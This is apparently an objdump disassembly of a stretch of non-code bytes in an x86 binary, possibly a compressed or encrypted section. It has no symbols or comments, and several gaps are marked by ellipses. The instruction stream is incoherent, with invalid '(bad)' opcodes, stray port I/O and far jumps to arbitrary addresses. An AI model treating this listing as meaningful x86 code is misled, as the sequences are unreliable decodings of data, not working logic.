  428c38:	and    DWORD PTR [ebx+eiz*1-0x78],edi
  428c3c:	push   edx
  428c3d:	or     eax,0x8b3c6c03
  428c42:	stos   BYTE PTR es:[edi],al
  428c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c44:	mov    esi,0xee54ab96
  428c49:	mov    al,0xb
  428c4b:	gs sub bh,bh
  428c4e:	and    al,0xeb
  428c50:	inc    eax
  428c51:	xor    BYTE PTR [eax+0x43],dh
  428c54:	or     DWORD PTR [ebx],ecx
  428c56:	inc    esp
  428c57:	fidivr DWORD PTR [ebp+0x45f05fc1]
  428c5d:	sbb    dh,bh
  428c5f:	pop    edx
  428c60:	mov    BYTE PTR [edi],bh
  428c62:	out    0x41,al
  428c64:	mov    DWORD PTR [esi+0x4e1cc48],edx
  428c6a:	cmp    BYTE PTR [esi-0x79],ah
  428c6d:	ins    DWORD PTR es:[edi],dx
  428c6e:	dec    ebx
  428c6f:	jbe    0x428c48
  428c71:	and    bl,0x2
  428c74:	and    ah,bh
  428c76:	sub    eax,eax
  428c78:	inc    esi
  428c79:	jp     0x428cb4
  428c7b:	scas   al,BYTE PTR es:[edi]
  428c7c:	sbb    eax,0x29399ea0
  428c81:	add    dh,BYTE PTR [ecx]
  428c83:	aaa    
  428c84:	dec    ebx
  428c85:	gs jmp 0x428c1d
  428c88:	jns    0x428c25
  428c8a:	call   ebx
  428c8c:	pop    ebx
  428c8d:	dec    ecx
  428c8e:	mov    eax,DWORD PTR [edi]
  428c90:	jg     0x428c12
  428c92:	push   es
  428c93:	mov    dl,0xdb
  428c95:	stos   BYTE PTR es:[edi],al
  428c96:	pusha  
  428c97:	in     eax,dx
  428c98:	push   ebx
  428c99:	or     DWORD PTR [ebx],ebp
  428c9b:	dec    esi
  428c9c:	aam    0x17
  428c9e:	add    al,0x26
  428ca0:	xchg   ebp,eax
  428ca1:	int3   
  428ca2:	loop   0x428c6d
  428ca4:	xor    bl,bl
  428ca6:	push   ecx
  428ca7:	fld    QWORD PTR [eax+eiz*8]
  428caa:	jmp    0x7838ca25
  428caf:	rcr    dl,0x9b
  428cb2:	sub    DWORD PTR [ebx-0xa1b39ca],ebx
  428cb8:	sti    
  428cb9:	xchg   esp,eax
  428cba:	sub    bh,BYTE PTR [eax+esi*8-0x1041a42d]
  428cc1:	mov    ebx,0x8c060c22
  428cc6:	xor    eax,0x824a81c9
  428ccb:	pop    eax
  428ccc:	mov    ebx,0x733c8f29
  428cd1:	repz les esp,FWORD PTR [edi+esi*4+0xa]
  428cd6:	(bad)  [eax+0x6a]
  428cd9:	popa   
  428cda:	hlt    
  428cdb:	mov    bl,ah
  428cdd:	sub    bh,bl
  428cdf:	sub    eax,0x75b197a9
  428ce4:	sbb    ebp,DWORD PTR [ecx+0x2c]
  428ce7:	rol    BYTE PTR [bx+si+0x55],cl
  428ceb:	adc    ch,al
  428ced:	jle    0x428c71
  428cef:	js     0x428c8a
  428cf1:	pushf  
  428cf2:	inc    ebp
  428cf3:	cmp    al,0x83
  428cf5:	xchg   ebx,eax
  428cf6:	mov    ah,0x90
  428cf8:	add    dl,BYTE PTR [ecx-0x10]
  428cfb:	jp     0x428d2c
  428cfd:	mov    ebp,DWORD PTR [ebx-0xb10e0cf]
  428d03:	lock adc DWORD PTR [edx],edi
  428d06:	jne    0x428d35
  428d08:	push   edx
  428d09:	imul   esi,DWORD PTR [ecx+0x69],0x54
  428d0d:	jecxz  0x428cb2
  428d0f:	int3   
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xc35a
  428d82:	in     al,dx
  428d83:	sbb    ebx,DWORD PTR [eax-0x4c]
  428d86:	add    DWORD PTR [eax],eax
  428d88:	add    al,0x1
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	cwde   
  428d8d:	push   edi
  428d8e:	mov    cl,0x24
  428d90:	sub    ah,0x8d
  428d93:	pop    esp
  428d94:	mov    edi,0x66710001
  428d99:	mov    cl,0xf3
  428d9b:	or     DWORD PTR [edx+0x40c8a959],ebp
  428da1:	or     DWORD PTR [ebp-0x7d3dbe3d],0x495b5b63
  428dab:	push   edi
  428dac:	inc    ebp
  428dad:	add    BYTE PTR [edi+eax*2+0x6d],ch
  428db1:	sub    esi,DWORD PTR [edi-0x75edb143]
  428db7:	aaa    
  428db8:	int3   
  428db9:	iret   
  428dba:	sbb    BYTE PTR [ecx+0x24],bh
  428dbd:	adc    al,0xbe
  428dbf:	invd   
  428dc1:	popf   
  428dc2:	pop    edx
  428dc3:	scas   eax,DWORD PTR es:[edi]
  428dc4:	ins    BYTE PTR es:[edi],dx
  428dc5:	sbb    BYTE PTR [ecx+0x1ab59c66],dl
  428dcb:	xchg   ecx,eax
  428dcc:	(bad)  
  428dcd:	popa   
  428dce:	lods   eax,DWORD PTR ds:[esi]
  428dcf:	jecxz  0x428e21
  428dd1:	mov    bh,0x45
  428dd3:	int3   
  428dd4:	jmp    0xe7e3:0x4ee951ed
  428ddb:	aad    0xb8
  428ddd:	push   edx
  428dde:	add    DWORD PTR [edi-0x6d],ebx
  428de1:	inc    ebx
  428de2:	pop    ds
  428de3:	dec    ebx
  428de4:	inc    ecx
  428de5:	aas    
  428de6:	dec    eax
  428de7:	dec    ecx
  428de8:	sbb    BYTE PTR [ebp+0x1a],0x75
  428dec:	push   ss
  428ded:	mov    esi,DWORD PTR [ebp+0x40b10ddd]
  428df3:	mov    ebx,0xc2b411a1
  428df8:	repnz mov bl,0x95
  428dfb:	pop    esp
  428dfc:	int    0xb5
  428dfe:	fldcw  WORD PTR [edx+0x1a589247]
  428e04:	mov    DWORD PTR [bp-0x26fa],ecx
  428e09:	pop    edx
  428e0a:	push   es
  428e0b:	adc    eax,0x13caa877
  428e10:	packsswb mm2,QWORD PTR [eax+0x1b]
  428e14:	fs imul ebp,esp,0xc32844ae
  428e1b:	inc    edi
  428e1c:	dec    edi
  428e1d:	hlt    
  428e1e:	cmp    ecx,DWORD PTR [ecx+0x491767aa]
  428e24:	mov    bl,0xae
  428e26:	or     DWORD PTR [ebx],0xf8cc8b4c
  428e2c:	arpl   WORD PTR [ebx-0x5c],cx
  428e2f:	shr    BYTE PTR es:[esi+0x7d],1
  428e33:	mov    bl,0x37
  428e35:	inc    esp
  428e36:	or     BYTE PTR [ecx+0x3c94b981],0xbd
  428e3d:	dec    ecx
  428e3e:	mov    cl,BYTE PTR [ecx]
  428e40:	jge    0x428e6f
  428e42:	cwde   
  428e43:	inc    eax
  428e44:	punpckhwd mm4,QWORD PTR [eax+ecx*2-0x76b0d4f2]
  428e4c:	pop    ebp
  428e4d:	pop    ds
  428e4e:	jno    0x428e06
  428e50:	mov    esp,0x69be066c
  428e55:	loop   0x428e21
  428e57:	in     eax,0x6a
  428e59:	stc    
  428e5a:	hlt    
  428e5b:	and    dh,BYTE PTR [ebx]
  428e5d:	hlt    
  428e5e:	sahf   
  428e5f:	or     eax,0x44ac62d0
  428e64:	xchg   ebx,eax
  428e65:	aas    
  428e66:	mov    ah,0x9d
  428e68:	push   esi
  428e69:	popa   
  428e6a:	sbb    al,0xf
  428e6c:	add    ch,BYTE PTR [edx]
  428e6e:	adc    ecx,eax
  428e70:	xchg   ebx,eax
  428e71:	adc    BYTE PTR [edi+0x6fbb62b8],dh
  428e77:	lock aas 
  428e79:	add    DWORD PTR [edi],ebx
  428e7b:	iret   
  428e7c:	sbb    al,0xd5
  428e7e:	aas    
  428e7f:	pushf  
  428e80:	mov    WORD PTR [ebp-0x4],gs
  428e83:	pop    ebx
  428e84:	jg     0x428ecd
  428e86:	xchg   edx,eax
  428e87:	push   edi
  428e88:	icebp  
  428e89:	dec    esp
  428e8a:	ins    DWORD PTR es:[edi],dx
  428e8b:	xchg   ebx,eax
  428e8c:	or     BYTE PTR [ecx],dl
  428e8e:	adc    ebx,ecx
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xb9
  428f01:	sbb    al,BYTE PTR [ebx+0x1b55cef]
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	aaa    
  428f0d:	or     bh,BYTE PTR [esi-0x7ef19bb4]
  428f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f14:	mov    eax,ds:0x70a9c5c9
  428f19:	adc    al,0x71
  428f1b:	mov    ds:0xde8588ad,al
  428f20:	fdivr  DWORD PTR [ecx-0x3d619e11]
  428f26:	fmul   QWORD PTR [edx+0x56]
  428f29:	lods   al,BYTE PTR ds:[esi]
  428f2a:	ret    
  428f2b:	xchg   esi,eax
  428f2c:	fnstsw WORD PTR [edx+ecx*1]
  428f2f:	outs   dx,BYTE PTR ds:[esi]
  428f30:	aas    
  428f31:	rcr    DWORD PTR [ebp-0x4960cf31],0x9d
  428f38:	xor    DWORD PTR [eax+0x39155c45],ebx
  428f3e:	push   esp
  428f3f:	sbb    al,0xff
  428f41:	pop    ebp
  428f42:	sbb    al,0x98
  428f44:	out    dx,al
  428f45:	(bad)  
  428f46:	adc    DWORD PTR [edx+eax*2+0xea9ce0b],ebx
  428f4d:	(bad)  
  428f4e:	ret    0x4571
  428f51:	xchg   edi,eax
  428f52:	and    cl,BYTE PTR [esi]
  428f54:	sti    
  428f55:	out    0x2d,al
  428f57:	in     al,dx
  428f58:	adc    BYTE PTR [ecx-0x2aa7db01],0xe1
  428f5f:	call   0xdbdf:0xa19bb8da
  428f66:	xor    DWORD PTR [ecx],0xa3719f48
  428f6c:	adc    DWORD PTR [ebx+eiz*4],esp
  428f6f:	repnz add eax,0xc13c08e8
  428f75:	js     0x428f23
  428f77:	fidivr DWORD PTR [ebx+ebx*4+0x16a566fe]
  428f7e:	push   ebp
  428f7f:	jb     0x428f70
  428f81:	push   cs
  428f82:	dec    ecx
  428f83:	and    DWORD PTR [ecx-0x57795830],esp
  428f89:	dec    ebp
  428f8a:	fnstenv [ebp+0x69]
  428f8d:	push   esp
  428f8e:	adc    DWORD PTR [edx-0x53011200],ebp
  428f94:	xor    al,0x21
  428f96:	dec    ebp
  428f97:	dec    edx
  428f98:	repz out dx,eax
  428f9a:	pusha  
  428f9b:	dec    ebp
  428f9c:	out    0x88,eax
  428f9e:	push   eax
  428f9f:	inc    ebp
  428fa0:	shl    DWORD PTR [ebx],cl
  428fa2:	mov    edi,0x85323bcb
  428fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fa8:	clc    
  428fa9:	repnz mov ebx,0x4dad3233
  428faf:	mov    ebx,0xbc4712a6
  428fb4:	adc    ah,BYTE PTR [edi-0x67]
  428fb7:	cld    
  428fb8:	jnp    0x429023
  428fba:	push   esi
  428fbb:	adc    cl,BYTE PTR [ecx+0x15]
  428fbe:	push   ecx
  428fbf:	and    BYTE PTR [edi+edi*8-0x67],bh
  428fc3:	imul   edi,DWORD PTR [eax-0x15],0xe720d977
  428fca:	mov    bh,0x3a
  428fcc:	inc    ebx
  428fcd:	or     DWORD PTR [ebx+0x51a1eaf6],ebp
  428fd3:	mov    dl,0xd9
  428fd5:	stc    
  428fd6:	mov    ch,0x31
  428fd8:	cmp    dl,BYTE PTR [esi+0x31]
  428fdb:	jp     0x42901b
  428fdd:	mov    ds:0x110fcf2d,eax
  428fe2:	inc    esp
  428fe3:	jmp    0x428fd3
  428fe5:	das    
  428fe6:	xor    BYTE PTR [ebx],ah
  428fe8:	(bad)  
  428fe9:	call   0x9284d8b7
  428fee:	mov    edx,0x2abd7968
  428ff3:	frstor [esi+0x57af0f2f]
  428ff9:	xchg   ebx,eax
  428ffa:	retf   0xe71d
  428ffd:	or     DWORD PTR [ecx-0x4f44bc5a],ecx
  429003:	stos   DWORD PTR es:[edi],eax
  429004:	xchg   ebp,eax
  429005:	add    eax,0x9e1d5966
  42900a:	jmp    FWORD PTR [ecx+0x3c]
  42900d:	aad    0x8f
  42900f:	retf   
	...
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xb2fc7b77
  429081:	jl     0x42905b
  429083:	arpl   WORD PTR [eax-0x4a],sp
  429086:	add    DWORD PTR [eax],eax
  429088:	add    al,0x1
  42908a:	add    BYTE PTR [eax],al
  42908c:	stos   DWORD PTR es:[edi],eax
  42908d:	bound  edx,QWORD PTR [ecx-0x4a2dcdba]
  429093:	jae    0x429042
  429095:	push   0xfc3b22d9
  42909a:	mov    dl,0x93
  42909c:	xor    dh,0x3c
  42909f:	dec    BYTE PTR [eax-0x2]
  4290a2:	ss loope 0x42904d
  4290a5:	pop    ds
  4290a6:	add    al,0xee
  4290a8:	xchg   edi,eax
  4290a9:	dec    DWORD PTR [eax]
  4290ab:	mov    ah,dl
  4290ad:	cmp    BYTE PTR [edi-0x69dbeac3],cl
  4290b3:	aas    
  4290b4:	sub    eax,0x1bbba1e6
  4290b9:	and    DWORD PTR [eax+0x77],edi
  4290bc:	mov    esp,0x4a4b8cb8
  4290c1:	sbb    bh,BYTE PTR [ebp-0x51f3014a]
  4290c7:	sub    esi,DWORD PTR [ebx-0x2f]
  4290ca:	fdiv   QWORD PTR [ebp+0x42]
  4290cd:	xchg   esi,eax
  4290ce:	xlat   BYTE PTR ds:[ebx]
  4290cf:	daa    
  4290d0:	jo     0x429059
  4290d2:	dec    edx
  4290d3:	popf   
  4290d4:	mov    ebp,0x612f79f6
  4290d9:	loop   0x429157
  4290db:	out    0x9,eax
  4290dd:	cld    
  4290de:	xor    BYTE PTR [esi+0x40],dl
  4290e1:	mov    eax,ds:0xd7dad4cf
  4290e7:	mov    dh,0xe0
  4290e9:	jmp    0x69ac:0xa57b60ac
  4290f0:	or     DWORD PTR [esi-0x1f],esi
  4290f3:	inc    eax
  4290f4:	jae    0x429084
  4290f6:	idiv   BYTE PTR [ecx]
  4290f8:	jmp    0x3026f0d
  4290fd:	in     eax,dx
  4290fe:	leave  
  4290ff:	fmul   QWORD PTR [esi-0x14]
  429102:	stos   BYTE PTR es:[edi],al
  429103:	inc    eax
  429104:	sbb    dl,BYTE PTR [ecx+0x2c2d364e]
  42910a:	out    dx,al
  42910b:	ret    
  42910c:	mov    ecx,0x8ab88819
  429111:	shl    DWORD PTR [ecx+eax*4-0x7a2469dd],1
  429118:	ins    BYTE PTR es:[edi],dx
  429119:	mov    ecx,0xa3089595
  42911e:	icebp  
  42911f:	xor    bh,dh
  429121:	xchg   esp,eax
  429122:	ret    
  429123:	jle    0x42915e
  429125:	popa   
  429126:	aam    0xd
  429128:	(bad)  
  42912a:	mov    eax,0xaa458488
  42912f:	loope  0x4290fe
  429131:	pop    ss
  429132:	sub    BYTE PTR [ebp+eiz*2-0x58],dl
  429136:	ins    DWORD PTR es:[edi],dx
  429137:	jmp    0x4290ed
  429139:	cwde   
  42913a:	push   esi
  42913b:	xchg   ecx,eax
  42913c:	dec    ecx
  42913d:	push   ds
  42913e:	xchg   BYTE PTR [ebx+0x68],bh
  429141:	repnz xchg edi,eax
  429143:	xchg   esi,eax
  429144:	mov    gs,edi
  429146:	(bad)  
  429147:	rol    ch,1
  429149:	cdq    
  42914a:	dec    ecx
  42914b:	push   edi
  42914c:	and    DWORD PTR [esi+0x38],edx
  42914f:	fldcw  WORD PTR [ebp-0x6e]
  429152:	sub    edi,DWORD PTR [eax]
  429154:	mov    ch,0x3c
  429156:	test   al,0x86
  429158:	jb     0x4290f3
  42915a:	and    al,0xcf
  42915c:	xor    eax,0x3ffa2176
  429161:	mov    DWORD PTR [edx],edi
  429163:	jnp    0x4291e3
  429165:	mov    al,0x78
  429167:	mov    eax,ds:0x209a1530
  42916c:	shl    BYTE PTR [edi+ebp*4+0x15],0x85
  429171:	add    DWORD PTR [edi-0x3030a031],0x3e
  429178:	inc    ecx
  429179:	dec    ebx
  42917a:	push   edx
  42917b:	jne    0x429163
  42917d:	jecxz  0x42917c
  42917f:	mov    ds:0xd71975f6,eax
  429184:	cli    
  429185:	and    bh,BYTE PTR [ecx+0x43980fff]
  42918b:	mov    al,0x14
  42918d:	pop    edi
  42918e:	add    ecx,DWORD PTR [ecx+0x0]
	...
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [edx+esi*4+0x64e241d2],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [edi+0x77fae2fd],bh
  429211:	cmp    al,BYTE PTR [ebx]
  429213:	arpl   WORD PTR [ecx],sp
  429215:	leave  
  429216:	cmc    
  429217:	push   ss
  429218:	mov    ebp,?
  42921a:	push   eax
  42921b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42921c:	cmp    eax,0xa9477388
  429221:	imul   edx,DWORD PTR [ebx+0x2e51c35f],0xdd0e8270
  42922b:	(bad)  
  42922c:	dec    ecx
  42922d:	shl    DWORD PTR [edx-0x32],0xa
  429231:	or     bh,BYTE PTR [edi+0x647fe0e9]
  429237:	mov    al,ds:0xaf4aa11b
  42923c:	mov    BYTE PTR [ebp-0x5dc2e78e],al
  429242:	add    eax,DWORD PTR [eax+0x4746163d]
  429248:	out    dx,al
  429249:	xchg   ebx,eax
  42924a:	popa   
  42924b:	bound  ebp,QWORD PTR [edi]
  42924d:	mov    bl,0x47
  42924f:	xor    al,0x91
  429251:	inc    ebx
  429252:	adc    al,0xc4
  429254:	pusha  
  429255:	xlat   BYTE PTR ds:[ebx]
  429256:	sbb    al,0xf6
  429258:	mov    esi,0xea4f1239
  42925d:	mov    al,0x64
  42925f:	lahf   
  429260:	ss push ds
  429262:	les    ebp,FWORD PTR [eax+0x169ac522]
  429268:	mov    edx,0x6e7c1716
  42926d:	aas    
  42926e:	xor    edi,DWORD PTR [eax+ebx*4+0x52557bce]
  429275:	sbb    dh,al
  429277:	add    ebx,DWORD PTR [edx]
  429279:	sti    
  42927a:	jp     0x42929c
  42927c:	sub    al,0x42
  42927e:	cmp    dl,BYTE PTR [edx+0x2]
  429281:	je     0x4292bf
  429283:	leave  
  429284:	repz pop ebx
  429286:	shr    esi,0x77
  429289:	fs fs das 
  42928c:	adc    ah,BYTE PTR [edi+0x255affd9]
  429292:	mov    bh,0xdb
  429294:	(bad)  
  429295:	(bad)  
  429296:	int3   
  429297:	repz sbb eax,0x892ac8f0
  42929d:	rol    DWORD PTR [esi-0x61d5d23c],cl
  4292a3:	js     0x429264
  4292a5:	inc    esi
  4292a6:	jmp    0x6446d86f
  4292ab:	xor    edx,ecx
  4292ad:	mov    WORD PTR [eax+0x242bd4b7],gs
  4292b3:	adc    edi,eax
  4292b5:	jno    0x4292c0
  4292b7:	ins    BYTE PTR es:[edi],dx
  4292b8:	cwde   
  4292b9:	push   ds
  4292ba:	das    
  4292bb:	add    al,0xcf
  4292bd:	fwait
  4292be:	scas   eax,DWORD PTR es:[edi]
  4292bf:	in     al,0x65
  4292c1:	sahf   
  4292c2:	mov    bl,0x88
  4292c4:	(bad)  
  4292c5:	(bad)  
  4292c6:	ja     0x429338
  4292c8:	sbb    DWORD PTR [ebp-0x3f],esi
  4292cb:	mov    WORD PTR [ebx],ds
  4292cd:	add    DWORD PTR [esi+0x74],0xb3690bba
  4292d4:	pop    edi
  4292d5:	or     eax,0xd6e84ae1
  4292da:	mov    al,0xa5
  4292dc:	jl     0x42927a
  4292de:	pusha  
  4292df:	nop
  4292e0:	sub    al,0x47
  4292e2:	xchg   esp,eax
  4292e3:	push   0x39
  4292e5:	mov    ds,edi
  4292e7:	mov    ch,0xd
  4292e9:	leave  
  4292ea:	(bad)  
  4292eb:	sbb    ah,BYTE PTR ds:0x40549cc
  4292f1:	ins    BYTE PTR es:[edi],dx
  4292f2:	mov    esp,0xeb4d7a66
  4292f7:	push   eax
  4292f8:	mov    esp,DWORD PTR [ecx]
  4292fa:	mov    al,0x6d
  4292fc:	mov    esp,DWORD PTR ds:0xd8b9de5b
  429302:	test   al,0xf1
  429304:	loope  0x4292ff
  429306:	scas   eax,DWORD PTR es:[edi]
  429307:	lds    ecx,FWORD PTR [edx]
  429309:	in     al,0xbc
  42930b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42930c:	pop    ebx
  42930d:	push   ebp
  42930e:	sub    ebx,DWORD PTR [ecx+0x0]
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x26
  429381:	jbe    0x429325
  429383:	cmp    eax,0x1b868
  429388:	add    al,0x1
  42938a:	add    BYTE PTR [eax],al
  42938c:	rol    DWORD PTR [edi],cl
  42938e:	cs jne 0x4293b4
  429391:	mov    cl,0xc
  429393:	sbb    al,0x7f
  429395:	push   0x7f
  429397:	adc    eax,0x2ebf2352
  42939c:	mov    ds:0xd16cf293,eax
  4293a1:	dec    esi
  4293a2:	shr    DWORD PTR [eax],cl
  4293a4:	scas   al,BYTE PTR es:[edi]
  4293a5:	not    DWORD PTR ds:0x20485a3e
  4293ab:	aad    0xcd
  4293ad:	mov    ecx,0xdbb27629
  4293b2:	cmp    dh,BYTE PTR [ebx+0x41]
  4293b5:	loopne 0x429402
  4293b7:	repnz gs pop esi
  4293ba:	test   BYTE PTR [ebx+edi*2],ah
  4293bd:	std    
  4293be:	sbb    al,0xb0
  4293c0:	clc    
  4293c1:	enter  0x18d3,0x12
  4293c5:	std    
  4293c6:	inc    ecx
  4293c7:	aam    0xa8
  4293c9:	adc    bh,BYTE PTR [esi]
  4293cb:	jo     0x4293f2
  4293cd:	and    ecx,DWORD PTR [ecx-0x31168f3c]
  4293d3:	jb     0x429402
  4293d5:	pop    edx
  4293d6:	mov    esp,?
  4293d8:	dec    edx
  4293d9:	mov    esi,0x78ef8037
  4293de:	add    ch,BYTE PTR [ebx-0x57]
  4293e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293e2:	jnp    0x42937f
  4293e4:	pop    ebp
  4293e5:	test   DWORD PTR [ebp-0x24],edx
  4293e8:	mov    eax,0xece03f1b
  4293ed:	fidivr DWORD PTR [edi-0x7e]
  4293f0:	icebp  
  4293f1:	inc    ebx
  4293f2:	or     al,BYTE PTR [ecx-0x45e05abe]
  4293f8:	pusha  
  4293f9:	aas    
  4293fa:	push   ds
  4293fb:	shl    BYTE PTR [esi],0x63
  4293fe:	mov    al,0x32
  429400:	test   al,0xe4
  429402:	ja     0x4293db
  429404:	mov    dh,0xc1
  429406:	and    eax,DWORD PTR [eax+ebp*4-0x42607dfa]
  42940d:	sub    BYTE PTR [edi],ch
  42940f:	mov    eax,0x12d47270
  429414:	jae    0x429434
  429416:	jo     0x429462
  429418:	and    al,0x5b
  42941a:	push   ds
  42941b:	scas   al,BYTE PTR es:[edi]
  42941c:	hlt    
  42941d:	dec    ebx
  42941e:	and    edx,edx
  429420:	and    edi,DWORD PTR [ebp+0x4e]
  429423:	pushf  
  429424:	or     ebp,DWORD PTR [ebp+0x2e28bb69]
  42942a:	fsubr  QWORD PTR [ecx-0x4dc62884]
  429430:	push   cs
  429431:	stos   BYTE PTR es:[edi],al
  429432:	mov    BYTE PTR [esi+0x3cb84a6a],dl
  429438:	cmc    
  429439:	mov    eax,0x8fe4876d
  42943e:	and    cl,BYTE PTR [ebx+0x32b8792e]
  429444:	data16 mov al,dl
  429447:	mov    edx,fs
  429449:	bound  edx,QWORD PTR [edx+0x3d]
  42944c:	in     eax,0x2e
  42944e:	xchg   ch,dl
  429450:	sub    dl,dl
  429452:	ins    DWORD PTR es:[edi],dx
  429453:	pop    esp
  429454:	add    DWORD PTR [edi+eax*1-0x486f8c8c],esi
  42945b:	lods   eax,DWORD PTR ds:[esi]
  42945c:	jnp    0x429423
  42945e:	mov    BYTE PTR [eax],al
  429460:	jmp    0x6ab5ccb0
  429465:	mov    ds:0xb40ce7ef,eax
  42946a:	inc    ebp
  42946b:	fwait
  42946c:	jbe    0x4294ed
  42946e:	ret    
  42946f:	test   al,0x42
  429471:	adc    eax,DWORD PTR [esi+eax*4-0x23]
  429475:	aaa    
  429476:	xchg   ebx,eax
  429477:	cld    
  429478:	adc    ch,BYTE PTR [ebx-0x117677e3]
  42947e:	cmp    esp,0x2d
  429481:	clc    
  429482:	or     ecx,DWORD PTR [esi-0xb]
  429485:	add    edx,DWORD PTR [edx]
  429487:	or     eax,0x9b88ba93
  42948c:	test   eax,0x4b7607
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x4093dfea],dx
  429503:	sub    ebp,DWORD PTR [ecx+edi*4+0x1]
  429507:	add    BYTE PTR [ecx+eax*1],al
  42950a:	add    BYTE PTR [eax],al
  42950c:	pushf  
  42950d:	jae    0x4294c9
  42950f:	jp     0x429584
  429511:	bswap  ebx
  429513:	pop    ss
  429514:	xchg   ebp,eax
  429515:	ins    DWORD PTR es:[edi],dx
  429516:	cld    
  429517:	mov    edi,DWORD PTR [edx+0x118509ee]
  42951d:	cld    
  42951e:	sbb    eax,0x12f0978a
  429523:	(bad)  
  429524:	mov    eax,0x257ac72b
  429529:	call   DWORD PTR [esi]
  42952b:	mov    edx,0xc40c3a4c
  429530:	push   edx
  429531:	dec    ebx
  429532:	repnz test BYTE PTR [eax],dh
  429535:	dec    esi
  429536:	xor    eax,eax
  429538:	xchg   ebx,eax
  429539:	mov    WORD PTR [ecx],cs
  42953b:	adc    ebx,edi
  42953d:	mov    ch,0x47
  42953f:	mov    dh,BYTE PTR [ecx-0x74822951]
  429545:	xchg   DWORD PTR [esi+0xbd530df],edx
  42954b:	lock (bad) 
  42954d:	gs lock dec ebp
  429550:	aaa    
  429551:	es out dx,al
  429553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429554:	inc    DWORD PTR [eax+0x42bc7050]
  42955a:	inc    eax
  42955b:	mov    bh,0x3b
  42955d:	lods   eax,DWORD PTR ds:[esi]
  42955e:	test   eax,0xb84cad5b
  429563:	add    DWORD PTR [edx-0x6c031f6a],edi
  429569:	adc    DWORD PTR [edi+0x10],edx
  42956c:	shl    BYTE PTR [ebx+0x7ddfcbee],0xf8
  429573:	in     al,0x50
  429575:	stc    
  429576:	sahf   
  429577:	adc    BYTE PTR [edi+0x10],0x5d
  42957b:	jnp    0x42955e
  42957d:	mov    ah,0xa5
  42957f:	jno    0x4295ae
  429581:	mov    ebx,0xe997fe77
  429586:	fsub   DWORD PTR [ebp+0x66068b11]
  42958c:	enter  0x9e1f,0xca
  429590:	jns    0x429587
  429592:	ja     0x429600
  429594:	outs   dx,DWORD PTR ds:[esi]
  429595:	fcom   DWORD PTR [edx-0x369cb358]
  42959b:	sbb    bl,BYTE PTR [esi]
  42959d:	fidiv  WORD PTR [ebx-0x1d13b8bb]
  4295a3:	jae    0x429554
  4295a5:	mov    bh,0xde
  4295a7:	outs   dx,BYTE PTR ds:[esi]
  4295a8:	xor    al,0x48
  4295aa:	xor    DWORD PTR [edi],ebp
  4295ac:	loope  0x429556
  4295ae:	jo     0x429591
  4295b0:	iret   
  4295b1:	mov    bl,0x1f
  4295b3:	mov    eax,ds:0x7686b862
  4295b8:	mov    ebx,0x974482e5
  4295bd:	cmp    ecx,DWORD PTR [edi]
  4295bf:	push   ebx
  4295c0:	xchg   ebx,eax
  4295c1:	pop    ebx
  4295c2:	adc    BYTE PTR [ebx+0x1eca225f],0xcf
  4295c9:	xlat   BYTE PTR ds:[ebx]
  4295ca:	mov    dh,0x13
  4295cc:	sbb    ah,BYTE PTR ds:0x5afac96
  4295d2:	outs   dx,DWORD PTR ds:[esi]
  4295d3:	or     al,0x4a
  4295d5:	ret    
  4295d6:	mov    eax,0x818c250d
  4295db:	(bad)  [ebp-0x78060a3b]
  4295e1:	loop   0x429590
  4295e3:	jecxz  0x429621
  4295e5:	mov    dl,0xb6
  4295e7:	dec    edx
  4295e8:	outs   dx,BYTE PTR ds:[esi]
  4295e9:	and    BYTE PTR [ecx+0x55],ch
  4295ec:	push   eax
  4295ed:	sbb    eax,0x4d13f1fb
  4295f2:	pop    edx
  4295f3:	shr    BYTE PTR [ebx-0xd30ca50],1
  4295f9:	xchg   ebp,eax
  4295fa:	mov    ebx,0x44434fd8
  4295ff:	fild   QWORD PTR [ecx-0x5dcdec1f]
  429605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429606:	in     al,0x61
  429608:	icebp  
  429609:	jle    0x429667
  42960b:	repnz pop edi
  42960d:	jl     0x42962f
  42960f:	jecxz  0x429611
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	icebp  
  429681:	ins    BYTE PTR es:[edi],dx
  429682:	popf   
  429683:	mov    cl,0x70
  429685:	mov    edx,0x1040001
  42968a:	add    BYTE PTR [eax],al
  42968c:	mov    dl,0x22
  42968e:	mov    eax,0xff00fd9a
  429693:	int3   
  429694:	mov    DWORD PTR [edi+0x53],esi
  429697:	inc    esp
  429698:	(bad)  
  429699:	cmp    BYTE PTR [edi-0x224fa963],bh
  42969f:	mov    ah,0xdf
